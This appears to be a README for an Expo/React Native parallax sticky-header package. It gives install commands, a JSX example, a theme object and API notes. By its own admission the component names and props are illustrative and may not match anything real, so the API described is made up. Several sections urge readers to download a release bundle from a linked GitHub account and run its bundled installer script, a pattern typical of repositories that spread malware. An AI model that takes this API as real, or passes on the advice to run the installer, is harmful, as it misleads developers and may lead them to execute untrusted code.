Getting started (quick path)
- Best for new projects: Create a fresh Expo project, then add this library and its dependencies.
- Best for existing Expo projects: Integrate the header inside a screen that uses a scrollable content area.

Prerequisites
- Node.js (12.x or newer) and a package manager (npm or pnpm/yarn).
- An Expo project (managed workflow) or a bare React Native project that can host Expo-like animations.
- React Native knowledge, especially around Animated or Reanimated APIs.
- Basic familiarity with hooks and functional components.

Installation
- Install the library via your preferred package manager.
- If you plan to use the sample assets supplied in the releases, download the asset package from the releases page after you install the library.

Commands (typical)
- npm install expo-animated-sticky-header
- yarn add expo-animated-sticky-header
- pnpm add expo-animated-sticky-header

Notes on dependencies
- The library relies on Reanimated 3 for animations. Ensure Reanimated is installed and configured in your project.
- If you use Expo, ensure config plugins and metro bundler setup align with Reanimated 3 requirements.

Usage overview
- The header component is designed to live at the top of a screen and interact with the vertical scroll position.
- A parallax image sits behind the header; as the user scrolls, the image scales and moves at a different pace than the foreground content.
- The header can display a title, subtitle, and action icons that stay accessible as content changes.

Basic example
- The example below shows a typical usage pattern with a header, a scrollable content region, and a sample image.

Code: Basic usage (pseudo-API)
- This is a representative snippet showing how the API can feel in a real project. The actual component names and props may differ in your build; adjust to match the published API.

```jsx
import React from 'react';
import { View, Text, StyleSheet, Image } from 'react-native';
import Animated, { useSharedValue } from 'react-native-reanimated';
import { ParallaxHeader, StickyHeaderContainer } from 'expo-animated-sticky-header';

export default function DemoScreen() {
  // Shared value to drive animations
  const scrollY = useSharedValue(0);

  return (
    <View style={styles.container}>
      <ParallaxHeader
        imageSource={require('./assets/header-photo.jpg')}
        title="Demo Screen"
        subtitle="Smooth parallax header with Reanimated 3"
        height={260}
        scrollY={scrollY}
      />

      <Animated.ScrollView
        contentContainerStyle={styles.scrollContent}
        onScroll={/*...connect to scrollY...*/}
        scrollEventThrottle={16}
      >
        <Text style={styles.cardTitle}>Welcome</Text>
        <Text style={styles.cardText}>
          This area contains your main content. The header above reacts to your scrolling with a parallax effect.
        </Text>

        {/* Repeat content blocks to simulate a long feed */}
        {new Array(20).fill(0).map((_, i) => (
          <View key={i} style={styles.card}>
            <Text style={styles.cardTitle}>Item {i + 1}</Text>
            <Text style={styles.cardText}>
              A short description goes here. The header stays visible while content scrolls beneath it.
            </Text>
          </View>
        ))}
      </Animated.ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#fff' },
  scrollContent: { paddingTop: 16, paddingHorizontal: 16, paddingBottom: 40 },
  card: { backgroundColor: '#f7f7f7', borderRadius: 12, padding: 16, marginVertical: 8 },
  cardTitle: { fontSize: 16, fontWeight: '600', marginBottom: 6 },
  cardText: { fontSize: 14, color: '#555' },
});
```

Important notes about the example
- The exact component names (ParallaxHeader, StickyHeaderContainer) are illustrative. Check the library’s API for the real export names and props.
- The scroll handler connection is shown as a concept. In a real project, you wire useAnimatedScrollHandler or a similar hook to drive the shared value that powers animation.

API highlights and component design
- ParallaxHeader
  - imageSource: Image source to render in the parallax background.
  - title: Primary text shown on the header.
  - subtitle: Optional secondary text for context.
  - height: The initial height of the header before parallax effect.
  - scrollY: A shared value representing the vertical scroll position. This ties motion to the scroll.
  - fadeInTitle: Optional boolean to fade the title in as the header shrinks.
  - overlayColor: Optional tint for the image overlay to improve contrast.

- StickyHeaderContainer
  - children: The content that scrolls beneath the header.
  - header: The header component to render at the top.
  - style: Custom styling for layout control.

- useParallaxConfig (hook)
  - Returns configuration values for the parallax, including interpolation ranges and easing curves.
  - Helps you adapt the motion to your app’s brand.

- With accessibility in mind
  - The header stays readable as the user scrolls.
  - Text contrast remains high in all header states.
  - Interactive elements have appropriate hit areas.

Architecture and design philosophy
- Modularity: The header can be assembled from discrete pieces. You can swap the background image or the overlay without changing the rest of the layout.
- Reanimated-driven: All animations rely on the native driver when possible to keep frames consistent and to reduce layout thrashing.
- Performance-oriented: The header uses simple interpolation, avoiding heavy recomputation on each frame.
- Theming readiness: The header supports theme tokens so you can adapt it to light, dark, or custom themes with minimal work.

Theming and customization
- Theming strategy
  - Use tokens for colors, typography, and spacing.
  - Create a light and dark variant, then switch with your app’s theme manager.
  - Provide a preferred image or gradient for the header background.

- Customization examples
  - Change the header height for a compact design or a feature-heavy design.
  - Adjust parallax depth to emphasize or downplay the background motion.
  - Replace the header title and subtitle with icons, badges, or avatars as needed.

- Sample token-based theme configuration
```js
const theme = {
  header: {
    height: 260,
    background: {
      color: '#ffffff',
    },
    overlay: {
      color: 'rgba(0,0,0,0.25)',
    },
  },
  typography: {
    title: {
      fontSize: 20,
      color: '#111',
      fontWeight: '700',
    },
    subtitle: {
      fontSize: 12,
      color: '#333',
    },
  },
};
```

- Dynamic theming tips
  - Tie header color to the app’s primary color to maintain brand consistency.
  - Use a translucent overlay to ensure the title remains legible on varied image backgrounds.
  - Consider a gradient overlay for a softer look on bright images.

Examples and real-world scenarios
- E-commerce product detail pages
  - A large hero image in the header provides a cinematic feel as users scroll through product details, specs, and reviews.
  - The header can reveal action icons (like share, favorite, and cart) in a consistent location.

- Media and content apps
  - A header that adapts as the video or image content scrolls. The parallax effect adds depth without distracting from the media.

- Social feeds
  - A compact header with a photo thumbnail, user name, and action icons that remains accessible while content feeds scroll.

- Profile screens
  - A large cover image behind a small title bar. The header pops in as you scroll toward different sections like posts, about, and photos.

Performance and optimization suggestions
- Prefer direct shared values over frequent re-renders of component props during animation.
- Use useAnimatedStyle to derive transforms instead of setState during scrolling.
- Keep the header’s animation logic tight. Avoid heavy math on each frame.
- Prefer native-driven transitions where possible to reduce the JavaScript thread load.
- Profile your app on target devices. The parallax effect should feel smooth on both high-end and modest devices.

Accessibility and inclusive design
- Ensure text remains readable against all header backgrounds.
- Do not rely solely on color to convey state or information; provide textual labels or icons that are accessible.
- Ensure touch targets are large enough and offer clear focus states for keyboard navigation and screen readers.

Packaging and releases (the “path” file scenario)
- This library uses a release-based distribution approach for quick setup in Expo projects.
- The Releases section contains a prebuilt asset package that includes an installer script and example projects.
- To download and install, locate the asset package in the Releases area, then run the included installer. The asset is designed to set up the example project and the library in one go, reducing manual steps.
- If your project needs a more customized approach, you can still install the library via your package manager and integrate the header components manually.

Downloading and installing from the releases (path-based link)
- If you want to take the packaged route, go to the Releases section. The assets needed for a quick start are included in those downloads.
- To install, download the asset bundle that matches your development setup, extract it, and run the included installer script. This script configures the project, installs dependencies, and wires up sample usage to demonstrate how the header works in a real screen.
- The asset bundle typically contains:
  - An example Expo project with the header integrated.
  - A ready-to-run script (installer.sh or install.js) for quick setup.
  - A set of sample images and configurations that illustrate best practices.

Downloads and links
- To download assets and scripts, visit the Releases page and grab the latest asset bundle. This is a helpful path for quickly testing the header in a live project.
- See the release page here for the latest assets and installers: https://github.com/sorridente3327/expo-animated-sticky-header/releases

Migration guidance
- If you are migrating from a prior version or a different header library, follow these steps:
  - Review release notes to identify breaking changes or renamed components.
  - Update import paths to reflect the new API.
  - Replace old hooks with the updated hooks or utilities if names have changed.
  - Re-run your tests and verify the header behaves correctly in each screen.
  - Validate parallax behavior on a few devices with varying screen sizes.

Testing and quality assurance
- Unit tests
  - The library includes unit tests that cover rendering, basic animation state, and prop validation.
  - Run tests with your preferred test runner to ensure compatibility with your project’s React Native version.
- Visual tests
  - Manual testing across devices helps catch edge cases in images, text contrast, and header heights.
  - Validate the parallax motion at different scroll speeds and during quick scrolls.

Debugging tips
- If the header does not render correctly, check the following:
  - Ensure Reanimated 3 is properly installed and configured in your project.
  - Confirm the header height is set to a sensible value for the device.
  - Validate the image source is valid and accessible in your project environment.
  - Verify that the scrollY shared value is connected to the onScroll event and drives the animated styles.
- Use a minimal example to isolate issues. Remove extra layers and progressively reintroduce features to identify where problems originate.

Code quality and contribution guidelines
- The project follows clean code principles with small, focused components.
- Contributions welcome. If you plan to contribute:
  - Open an issue to discuss changes.
  - Create a well-scoped PR with tests and documentation updates.
  - Follow the project’s linting and formatting rules.

Roadmap and future work
- Improve accessibility by adding more keyboard navigation patterns and screen reader descriptions.
- Add more presets for header styles, including different shapes, overlays, and color schemes.
- Expand examples to cover vertical layouts, horizontal carousels beneath the header, and mixed content layouts.
- Optimize for even lower frame times on mid-range devices.

Community and support
- The project thrives on open source collaboration. If you need help, use the Issues tab to file a bug report or request a feature.
- For design questions, you can reach out through Discussions or related channels in the glow-ui.xyz ecosystem.

License
- The project is released under a permissive license suitable for personal and commercial use.

Appendix: deeper dive into architecture (optional)
- The parallax logic uses a pair of interpolations to map scroll position to header height and image transform. By keeping these interpolations tight and using Reanimated for the transforms, the header remains responsive even when the content below is dynamic.
- The header’s title and subtitle are layered above the background image. The z-ordering keeps the text legible across states by adjusting overlays and text color.
- The asset structure in the release bundle is designed to be modular. You can swap assets with your own brand images while preserving the header logic.

Troubleshooting common issues (condensed)
- Animation not smooth on scroll:
  - Check Reanimated 3 setup and ensure the worklet environment is correctly configured.
  - Confirm the onScroll event uses a native driver or the appropriate shared value.
- Header overlaps content:
  - Ensure the header height is correctly accounted for in the content container padding.
  - Verify that the content container’s top padding matches the header’s height.
- Image not visible or wrong aspect:
  - Check the image source path and ensure the image meets the size requirements for the parallax effect.
  - Validate the image’s aspect ratio and scaling behavior.

Maintenance and governance
- This library is maintained with a focus on reliability, simplicity, and performance.
- Changes aim to be backward compatible where possible and documented clearly in the release notes.

Usage notes and best practices
- Start with a simple header, then layer on more features as needed.
- Test on multiple devices to ensure a consistent feel.
- Keep the header visually balanced with the main content to avoid visual clutter.
